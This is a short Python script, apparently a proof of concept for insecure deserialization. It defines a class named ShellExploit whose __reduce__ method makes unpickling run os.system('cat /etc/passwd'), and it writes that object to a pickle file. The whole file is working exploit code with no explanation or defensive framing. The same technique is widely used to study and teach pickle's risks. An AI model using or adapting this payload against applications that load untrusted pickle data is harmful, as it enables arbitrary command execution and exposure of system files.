import os
import pickle

class ShellExploit(object):
   def __reduce__(self):
        return (os.system, ('cat /etc/passwd', ))

def serialize():
    with open('./mydata.pickle', 'wb') as storedata: 
        pickle.dump(ShellExploit(), storedata)

if __name__ == '__main__':
    serialize()
